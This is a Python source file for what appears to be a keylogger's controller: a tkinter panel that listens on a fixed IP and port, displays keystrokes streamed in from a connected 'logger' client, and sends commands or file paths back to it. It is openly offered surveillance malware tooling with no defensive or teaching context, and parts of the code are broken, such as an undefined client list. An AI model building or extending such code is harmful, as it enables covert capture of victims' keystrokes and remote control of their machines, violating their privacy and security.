import socket
import threading
import tkinter as tk
from tkinter import filedialog

class Server:
    def __init__(self):
        self.file = None
        self.connected_logger = None
        self.root = tk.Tk()
        self.root.title("File Selector")
        self.root.geometry("500x500")

        self.panel_frame = tk.Frame(self.root)
        self.panel_frame.pack()

        self.select_button = tk.Button(self.root, text="Select File", command=self.select_file)
        self.select_button.pack(pady=20)

        self.label = tk.Label(self.root, text="No file selected")
        self.label.pack(pady=20)

        self.headline1_label = tk.Label(self.panel_frame, text="KeyStrokes")
        self.headline1_label.grid(row=0, column=0, padx=5, pady=5)

        self.headline2_label = tk.Label(self.panel_frame, text="Commends")
        self.headline2_label.grid(row=0, column=1, padx=5, pady=5)

        self.text_area = tk.Text(self.panel_frame, height=10, width=30)
        self.text_area.grid(row=1, column=0, padx=5, pady=5)

        self.text2 = tk.Text(self.panel_frame, height=10, width=30)
        self.text2.grid(row=1, column=1, padx=5, pady=5)

        self.button = tk.Button(self.root, text="Send Command", command=self.handle_sending)
        self.button.pack(pady=5)

        self.stop = False
        self.server_socket = None
        self.worker_thread = threading.Thread(target=self.create_listening_server)
        self.worker_thread.start()
        print("Server thread started")
        self.root.mainloop()

    def handle_sending(server):
            server.send_message_to_client(server.file)


    def select_file(self):
        # Open a file dialog and return the selected file path
        file_path = filedialog.askopenfilename()
        if file_path:
            print(f"Selected file: {file_path}")
            self.label.config(text=f"Selected file: {file_path}")
            self.file = file_path

    def on_closing(self):
        self.stop = True
        self.worker_thread.join()
        print("Server thread stopped")
        # Ensure the socket is closed even if the thread is stopped abruptly
        if self.server_socket:
            self.server_socket.close()

    def create_listening_server(self):
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        local_ip = "172.20.10.5"
        local_port = 10319
        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server_socket.bind((local_ip, local_port))
        print("Listening for incoming messages..")
        self.server_socket.listen(1)
        self.receive_messages_in_a_new_thread()

    def receive_messages(self, so):
        while not self.stop:
            incoming_buffer = so.recv(256)
            if not incoming_buffer:
                break
            self.last_received_message = incoming_buffer.decode('utf-8')
            self.text_area.insert(tk.END, self.last_received_message)
        so.close()

    def broadcast_to_all_clients(self, senders_socket):
        for client in self.clients_list:
            socket, (ip, port) = client
            if socket is not senders_socket:
                socket.sendall(self.last_received_message.encode('utf-8'))

    def receive_messages_in_a_new_thread(self):
        while not self.stop:
            client = so, (ip, port) = self.server_socket.accept()
            self.connected_logger = client
            print('Connected to ', ip, ':', str(port))
            t = threading.Thread(target=self.receive_messages, args=(so,))
            t.start()

    def send_message_to_client(self, message):
        if self.connected_logger:
            try:
                print(self.connected_logger)
                self.connected_logger[0].sendall(message.encode('utf-8'))
                print(f"Sent message: {message}")
            except Exception as e:
                print(f"Error sending message: {e}")
        else:
            print("No client connected")
if __name__ == "__main__":
    Server()
